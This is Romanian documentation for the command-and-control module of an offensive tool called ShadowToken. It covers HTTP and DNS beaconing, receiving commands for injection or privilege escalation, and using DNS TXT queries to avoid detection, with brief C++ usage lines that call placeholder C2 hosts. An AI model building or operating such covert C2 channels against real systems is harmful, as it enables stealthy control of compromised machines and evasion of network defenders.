# Modulul C2 Communication - Comunicare Command & Control

## Descriere
Modulul de comunicare C2 din ShadowToken gestionează conexiunea între tool și serverul de comandă și control. Acesta trimite periodic beacon-uri pentru a menține conexiunea activă și primește comenzi de la server. Modulul suportă comunicare C2 prin HTTP și DNS, oferind flexibilitate în funcție de cerințele operaționale și mediul de rețea.

## Funcții Principale

### 1. SendBeaconHTTP
Trimite un beacon prin HTTP la serverul C2, utilizat pentru a menține o conexiune activă și pentru a verifica periodic statusul. Beacon-ul poate include informații de identificare ale sistemului și semnalează prezența ShadowToken pe rețea.

- **Parametri**:
  - `serverUrl` - URL-ul serverului C2.
- **Returnează**: Răspunsul serverului C2 sub formă de text.

```cpp
// Exemplu de utilizare
C2_HTTP httpC2("http://c2.example.com");
std::string response = httpC2.SendBeacon();
```
### 2. ReceiveCommandHTTP
Primește comenzi de la serverul C2 prin HTTP. Comenzile primite pot include instrucțiuni pentru injecții, escaladare de privilegii sau actualizări de configurare.

Parametri: Niciunul.
Returnează: Comanda trimisă de server sub formă de text.
```cpp
// Exemplu de utilizare
std::string command = httpC2.ReceiveCommand();
```
### 3. SendBeaconDNS
Trimite un beacon la serverul C2 folosind o interogare DNS, simulând o interogare de tip TXT. Aceasta tehnică este utilizată pentru a reduce detectarea pe rețele unde traficul DNS nu este monitorizat strict.

Parametri:
* dnsDomain - Domeniul utilizat pentru interogarea DNS C2.
Returnează: Răspunsul serverului C2.
```cpp
// Exemplu de utilizare
C2_DNS dnsC2("c2dns.example.com");
std::string response = dnsC2.SendBeacon();
```
### 4. ReceiveCommandDNS
Primește comenzi de la serverul C2 prin intermediul unui răspuns la o interogare DNS. Comenzile sunt incluse în răspunsurile de tip TXT, permițând ShadowToken să opereze stealth în rețele monitorizate.

Parametri: Niciunul.
Returnează: Comanda de la server C2.
```cpp
// Exemplu de utilizare
std::string command = dnsC2.ReceiveCommand();
```
## Structura Modulului
Principalele fișiere din acest modul sunt:

* c2_http.cpp: Implementare pentru comunicarea C2 prin HTTP.
* c2_dns.cpp: Implementare pentru comunicarea C2 prin DNS.

## Importanța Modulului C2 Communication
Modulul de comunicare C2 este crucial pentru controlul și monitorizarea ShadowToken pe sistemele țintă. Acesta permite tool-ului să primească instrucțiuni de la serverul C2 în timp real, asigurând flexibilitate în acțiunile întreprinse și adaptabilitate în funcție de răspunsurile rețelei și mediului.

## Recomandări de Utilizare
Utilizați SendBeaconHTTP și ReceiveCommandHTTP pentru comunicare C2 pe rețele neprotejate sau când traficul HTTP este permis.
Folosiți SendBeaconDNS și ReceiveCommandDNS pe rețele monitorizate, unde traficul DNS nu este restricționat și poate evita detectarea.

## Referinte
[Documentație Microsoft DNS](https://learn.microsoft.com/en-us/windows/win32/dns/dns-start-page)
